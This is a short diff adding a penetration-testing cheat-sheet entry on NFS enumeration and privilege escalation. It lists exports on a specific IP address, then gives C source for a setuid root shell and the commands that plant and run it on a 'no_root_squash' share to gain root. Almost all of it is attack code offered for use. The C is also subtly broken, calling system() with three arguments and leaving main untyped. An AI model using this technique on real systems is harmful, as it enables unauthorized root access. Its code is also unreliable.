@@ -1,1 +1,16 @@
+NFS Enumeration
+List NFS exported shares:
+showmount -e 192.168.110.102
+...and check if 'rw,no_root_squash' is present. If it is present, compile the below sid-shell.c:
+
+#include <unistd.h>
+
+main( int argc, char ** argv, char ** envp )
+{
+    setgid(0); setuid(0); system("/bin/bash", argv, envp);
+    return 0;
+}
+
+...upload it to the share and execute the below to launch sid-shell to spawn a root shell:
+chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
 
